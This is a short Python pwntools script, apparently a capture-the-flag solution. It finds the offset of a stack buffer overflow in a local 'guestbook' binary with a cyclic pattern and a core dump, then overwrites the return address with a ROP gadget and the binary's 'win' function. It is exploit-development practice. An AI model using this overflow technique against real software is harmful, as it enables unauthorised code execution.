#!/usr/bin/env python3

from pwn import * 

ROP_GADGET = 0x40101a

context.binary = elf = ELF('./guestbook',checksec = False)

#find the offset
p = process('./guestbook')
code = cyclic(200)
p.recvuntil('name?\n')
p.sendline(code)
p.wait()

core = Coredump('./core.%d' % p.pid) #use core-file to see values of registers at the moment of crash
#print(hex(core.rip)) #position of the rip 
offset = cyclic_find(core.fault_addr)

payload = b'A'*offset + p64(ROP_GADGET) + p64(elf.sym.win)

#perform the exploit
p2 = process('./guestbook')
p2.recvuntil('name?\n')
p2.sendline(payload)

p2.interactive()
